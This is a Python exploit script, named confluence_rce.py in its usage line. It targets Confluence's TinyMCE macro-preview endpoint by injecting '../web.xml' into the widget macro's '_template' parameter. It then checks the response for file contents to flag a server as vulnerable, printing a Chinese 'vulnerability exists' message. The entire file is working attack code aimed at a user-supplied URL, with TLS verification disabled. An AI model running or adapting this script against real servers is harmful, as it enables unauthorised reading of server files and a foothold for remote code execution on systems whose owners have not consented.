#!/usr/bin/env python
# -*- coding: utf-8 -*-

from collections import OrderedDict
import requests
import re
import sys
import urllib3

urllib3.disable_warnings()
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
payload_dict = OrderedDict([('../web.xml','<param-name>')])

#proxies = {'http':'http://127.0.0.1:4321','https':'https://127.0.0.1:4321'}
proxies = {}

def check_url(url):
    vul_url = url + 'rest/tinymce/1/macro/preview'
    headers = {
        'Referer':url,
        'Content-Type':'application/json; charset=utf-8',
        'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:60.0) Gecko/20100101 Firefox/60.0'
    }

    for payload in payload_dict:
        regx = payload_dict[payload]
        print(payload)
        data = '{{"contentId": "786457", "macro": {{"name": "widget", "body": "", "params": {{"url": "https://www.viddler.com/v/23464dc5", "width": "1000", "height": "1000", "_template": "{payload}"}}}}}}'.format(payload=payload)
        rsp = requests.post(vul_url,data=data,verify=False,headers=headers,proxies=proxies)
        if re.search(regx,rsp.content):
            print("存在漏洞：##########" + payload + "##########")
            exit()

if __name__ == '__main__':
    if len(sys.argv) == 1:
        print("python confluence_rce.py http://test.com/")
    else:
        check_url(sys.argv[1])
